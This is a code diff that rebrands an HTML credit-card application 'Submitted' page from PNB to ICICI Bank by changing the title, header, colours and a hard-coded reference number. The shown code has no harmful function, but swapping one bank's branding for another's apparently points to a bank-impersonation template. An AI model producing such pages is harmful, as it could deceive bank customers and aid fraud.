@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submitted | PNB Credit Card</title>
+    <title>Submitted | ICICI Credit Card</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,7 +13,7 @@
             text-align: center;
         }
         .header {
-            background-color: #7a0c24;
+            background-color: #d96800;
             color: white;
             padding: 15px;
             font-weight: bold;
@@ -44,8 +44,8 @@
         p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
         
         .ref-box {
-            border: 2px dashed #ffeef2;
-            background-color: #fff9fa;
+            border: 2px dashed #fff2e6;
+            background-color: #fffaf5;
             padding: 15px;
             border-radius: 10px;
             display: flex;
@@ -55,10 +55,10 @@
         }
         .ref-text { text-align: left; }
         .ref-text div { font-size: 11px; color: gray; font-weight: bold; }
-        .ref-text code { font-size: 18px; color: #7a0c24; font-weight: bold; font-family: monospace; }
+        .ref-text code { font-size: 18px; color: #d96800; font-weight: bold; font-family: monospace; }
         .copy-btn {
-            background-color: #ffeef2;
-            color: #7a0c24;
+            background-color: #fff2e6;
+            color: #d96800;
             border: none;
             padding: 6px 12px;
             border-radius: 5px;
@@ -95,7 +95,7 @@
 </head>
 <body>
 
-    <div class="header">PNB Credit Card</div>
+    <div class="header">ICICI Bank Credit Card</div>
 
     <div class="success-container">
         <div class="success-icon">✓</div>
@@ -106,7 +106,7 @@
         <div class="ref-box">
             <div class="ref-text">
                 <div>REFERENCE NO.</div>
-                <code id="refCode">APPE32143CF</code>
+                <code id="refCode">ICICI32143CF</code>
             </div>
             <button class="copy-btn" id="copyBtn">Copy</button>
         </div>
@@ -141,8 +141,8 @@
                 
                 setTimeout(() => {
                     copyBtn.innerText = 'Copy';
-                    copyBtn.style.backgroundColor = '#ffeef2';
-                    copyBtn.style.color = '#7a0c24';
+                    copyBtn.style.backgroundColor = '#fff2e6';
+                    copyBtn.style.color = '#d96800';
                 }, 2000);
             }).catch(err => {
                 alert('Failed to copy text.');
